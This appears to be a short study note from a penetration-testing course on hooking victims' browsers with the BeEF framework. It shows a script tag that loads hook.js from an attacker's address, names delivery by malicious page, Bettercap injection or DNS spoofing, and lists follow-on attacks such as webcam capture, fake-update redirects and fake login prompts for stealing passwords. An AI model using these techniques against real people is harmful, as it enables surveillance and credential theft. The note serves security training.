# Hooking browsers with BeEF
-   Browser exploitation framework, allows to run number of attacks on hooked browsers. Victims are hooked once they open malicious website.
-   After opening BeEF (find program: BeEf Start), cmd will show-up. On first attempt it will want to create password.
-   BeEF creates hooking script and link to it shows in the cmd. Copy the path, add your url/ip address create a webpage loading this script (`<script src="url:3000/hook.js"></script>`) and send it to the victim / put it inside the website as MITM / DNS spoof / ...
-   After victim machine will run the script, it will show inside the web UI of BeEF all the information regarding the hooked machine including connection and it will enable to run attacks on the hooked browser.
-   To stop BeEf, find program called BeEf Stop

## Hooking tagets using Bettercap (MITM)
-   JavaScript injection
-   create JavaScript file as in attachments/inject_beef.js (to use it modify 'YourIP')
-   Inject it in the same way as described in 06_MITM.MD (Basic JS code injection)

## After hooking the website
-   The BeEF shows many available commands.
-   It includes basic commands like show alert inside the hooked browser, but also more sufficient ones like screenshots, running camera, redirecting the browser to any url (install malicious update), ...
-   Also allows to steal passwords by showing fake login input on top of any page saying user was logged out and prompting user to log back in (for example Facebook).